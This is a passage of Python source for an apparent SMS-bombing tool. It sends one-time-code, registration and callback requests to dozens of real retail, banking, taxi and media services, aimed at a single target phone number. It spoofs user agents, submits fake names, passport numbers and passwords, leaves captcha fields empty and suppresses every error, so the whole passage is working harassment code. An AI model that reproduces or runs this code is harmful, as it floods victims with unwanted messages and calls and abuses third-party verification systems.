                formatted_phone = format_phone(phone, "+# ### ### ## ##")
                get("https://makimaki.ru/system/callback.php", params={"cb_fio": name, "cb_phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", "User-Agent": generate_user_agent()})
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://loany.com.ua/funct/ajax/registration/code", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website", "User-Agent": generate_user_agent()}, json={"Phone": phone, "Type": 1})
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "# (###) ###-##-##")
                post("https://kilovkusa.ru/ajax.php", params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"}, data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://kaspi.kz/util/send-app-link", data={"address": phone9}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://izi.ua/api/auth/register", json={"phone": "+" + phone, "name": name, "is_terms_accepted": True}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+## (###) ###-##-##")
                post("https://iqlab.com.ua/session/ajaxregister", data={"cellphone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2", headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal", "User-Agent": generate_user_agent()}, json={"Birthday": "1986-07-10T07:19:56.276+02:00", "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999), "FirstName": name, "Gender": "M", "LastName": name, "SecondName": name, "Phone": phone9, "Email": email})
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://api.hmara.tv/stable/entrance", params={"contact": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONAL_PHONE]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": phone9}}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": "+" + phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://foodband.ru/api?call=calls", data={"customerName": name, "phone": formatted_phone, "g-recaptcha-response": ""}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone9, "g-recaptcha-response": ""}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, data={"loginId": "+" + phone})
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.flipkart.com/api/6/user/signup/status", headers={"Origin": "https://www.flipkart.com", "User-Agent": generate_user_agent()}, json={"loginId": "+" + phone, "supportAllStates": True})
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://findclone.ru/register", params={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://2407.smartomato.ru/account/session", json={"phone": formatted_phone, "g-recaptcha-response": None}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://www.etm.ru/cat/runprog.html", data={"m_phone": phone9, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+## (###) ###-##-##")
                post("https://e-groshi.com/online/reg", data={"first_name": name, "last_name": name, "third_name": name, "phone": formatted_phone, "password": password, "password2": password}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.easypay.ua/api/auth/register", json={"phone": phone, "password": password}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://my.dianet.com.ua/send_sms/", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://api.creditter.ru/confirm/sms/send", json={"phone": formatted_phone, "type": "register"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://cinema5.ru/api/phone_code", data={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+" + phone, "type": "authenticateCode"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3", "User-Agent": generate_user_agent()})
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone9, "(###)###-##-##")
                post("https://bluefin.moscow/auth/register/", data={"phone": formatted_phone, "sendphone": "Далее"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://app.benzuber.ru/login", data={"phone": "+" + phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://bartokyo.ru/ajax/login.php", data={"user_phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://bamper.by/registration/?step=1", data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone9, "(###) ###-##-##")
                get("https://avtobzvon.ru/request/makeTestCall", params={"to": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://oauth.av.ru/check-phone", json={"phone": formatted_phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone}, headers=headers)
            except:
                logger.warning(SMS_ERR)
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
                post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": formatted_phone, "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"}, headers=headers)
            except:
                logger.warning(SMS_ERR)
    except Exception as err:
        logger.error(f"{err}")
        await send_log_to_dev()